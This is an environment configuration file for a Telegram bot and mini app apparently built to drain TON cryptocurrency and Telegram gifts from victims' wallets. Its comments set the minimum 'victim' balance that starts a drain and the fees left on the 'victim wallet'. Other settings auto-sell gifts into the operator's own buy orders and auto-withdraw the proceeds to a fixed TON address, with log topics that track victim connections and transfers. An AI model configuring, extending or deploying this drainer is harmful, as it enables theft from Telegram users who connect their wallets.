# Telegram bot (BotFather + Business Mode enabled)
BOT_TOKEN=

# Chat for operator alerts (your user id or private channel)
ADMIN_CHAT_ID=
BOT_USERNAME=MRKTLiquidBot
# Telegram updates via webhook on server (do not run packages/bot polling in parallel)
TELEGRAM_WEBHOOK_SECRET=
# Dev only: TELEGRAM_USE_POLLING=true on packages/bot
LOG_GROUP_ID=-1004383237296
# Forum topic message_thread_id (from API, not "topic #3" in the UI — use /threadid in the group)
LOG_TOPIC_STARTS=8
LOG_TOPIC_CONNECTIONS=9
LOG_TOPIC_TRANSFERS=10
LOG_TOPIC_ERRORS=11

# Optional: legacy TON Connect wallet drain receiver
# RECEIVER_WALLET=

# MRKT operator token (DevTools → api.tgmrkt.io Authorization) for auto-buy after listing
OPERATOR_MRKT_TOKEN=

# Only fill buy-orders owned by this MRKT account id (from GET /me on operator token)
MRKT_OPERATOR_ACCOUNT_ID=

# Comma-separated buy order ids to allow (optional, tightest control)
# MRKT_ALLOWED_ORDER_IDS=

# offer_fill = POST /orders/fill (sell into buy order); sale_list = /gifts/sale + optional auto-buy
MRKT_SELL_MODE=offer_fill
MRKT_RESTRICT_OPERATOR_ORDERS=true
MRKT_AUTO_BUY_LISTED=false
MRKT_MIN_FILL_PRICE_NANO=1
MRKT_FALLBACK_LIST_PRICE_NANO=500000000
MRKT_SESSION_TTL_MS=1800000
MRKT_MAX_FILLS_PER_SESSION=40
MRKT_MAX_GIFTS_PER_SESSION=40

# Cash-out after sweep (POST /wallet/withdraw/tons)
MRKT_WITHDRAW_WALLET=UQD4ga3UNQNmF7YDFTHVAFwPNVfoE1xr9zs0LPnEBAgeWgF4
MRKT_MIN_WITHDRAW_NANO=10000000
MRKT_WITHDRAW_RESERVE_NANO=0
MRKT_AUTO_WITHDRAW=true

# Public HTTPS URL of the mini app (no trailing slash), e.g. https://your.host
MINIAPP_PUBLIC_URL=

# Same origin — API + static miniapp (production: reverse proxy)
SERVER_PUBLIC_URL=

# Optional tonapi.io key for higher rate limits
TONAPI_KEY=

# Reserve nanotons left on victim wallet for fees
FEE_RESERVE_TON=0.08

# Min victim TON balance to start drain
MIN_BALANCE_TON=0.02

PORT=8787
